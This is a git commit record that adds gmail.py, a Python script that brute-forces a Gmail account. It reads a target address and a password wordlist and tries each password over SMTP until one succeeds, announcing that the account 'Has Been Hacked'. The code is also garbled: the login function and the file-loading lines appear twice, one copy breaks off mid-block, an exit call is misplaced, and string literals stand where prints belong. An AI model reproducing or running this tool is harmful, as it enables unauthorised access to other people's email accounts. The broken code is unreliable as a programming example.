57a476b8246eb28f3863fce73c376341c083f883
a775 <50821355+a775@users.noreply.github.com>
2019-06-13 07:43:36 +0300

    Create gmail.py

---
+++ gmail.py
@@ -0,0 +1,80 @@
+#!/usr/bin/python
+
+'''K. I. N. G'''
+
+import smtplib
+from os import system
+W = '\033[1;34;40m'
+Br = '\033[1;32;40m'
+Bg = '\033[1;31;40m'
+Y = '\033[1;32;40m'
+Bb = '\033[1;32;40m'
+Bm = '\033[1;32;40m'
+Bc = '\033[1;32;40m'
+M = '\033[1;34m'
+C = '\033[1;31m'
+
+
+def main():
+   print(M)
+'================================================='
+main()
+print(Bc)
+'[1] start'
+print
+option = input('==>')
+if option == 1:
+   file_path = raw_input('wordlist :')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+ exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('email :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] this password==> :' + password + '     '
+
+            break
+         else:
+            print '[!] »»»»»»»» ' + password
+login()
